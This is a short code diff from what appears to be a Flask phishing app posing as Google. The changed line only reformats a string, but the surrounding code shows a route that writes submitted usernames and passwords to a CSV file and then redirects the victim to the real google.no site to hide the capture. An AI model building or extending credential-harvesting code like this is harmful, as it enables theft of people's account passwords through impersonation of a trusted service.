@@ -7,7 +7,7 @@ app.config['SERVER_NAME'] = 'google.com:5000'
 @app.route('/success/<name>/<password>')
 def success(name, password):
     with open("data.csv", "a") as myfile:
-        myfile.write(f"{name},{password}\n")    
+        myfile.write("{},{}\n".format(name, password))    
     return redirect('https://google.no')
 
 @app.route('/login', methods = ['POST', 'GET'])
